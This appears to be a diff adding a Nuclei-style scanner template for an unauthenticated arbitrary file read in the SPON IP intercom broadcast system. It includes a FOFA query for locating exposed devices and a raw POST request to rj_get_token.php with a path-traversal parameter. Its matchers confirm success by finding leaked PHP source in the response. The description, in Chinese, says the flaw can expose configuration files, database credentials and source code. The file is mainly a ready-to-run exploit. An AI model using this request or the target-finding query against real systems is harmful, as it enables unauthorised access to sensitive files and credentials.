@@ -1,0 +1,30 @@
+id: spon-ip-intercom-rj_get_token-file-read
+
+info:
+  name: "SPON IP网络对讲广播系统 rj_get_token.php 任意文件读取"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="vendors/toastr-master/build/toastr.min.js"
+      该漏洞源于目标系统在处理rj_get_token.php接口时未正确校验文件访问路径，攻击者可通过构造恶意请求读取任意文件内容。此缺陷可能导致服务器敏感信息泄露，包括但不限于系统配置文件、数据库凭证及源代码等。漏洞利用需满足目标系统存在可访问的文件路径条件，且无需身份验证即可触发。
+  tags: SPON
+
+http:
+- raw:
+  - |
+    POST /php/rj_get_token.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    jsondata[url]=../php/rj_get_token.php
+
+  matchers-condition: and
+  matchers:
+    - type: status
+      status: [200]
+    - type: word
+      part: body
+      words:
+        - "$result"
+        - 'file_get_contents('
+      condition: and
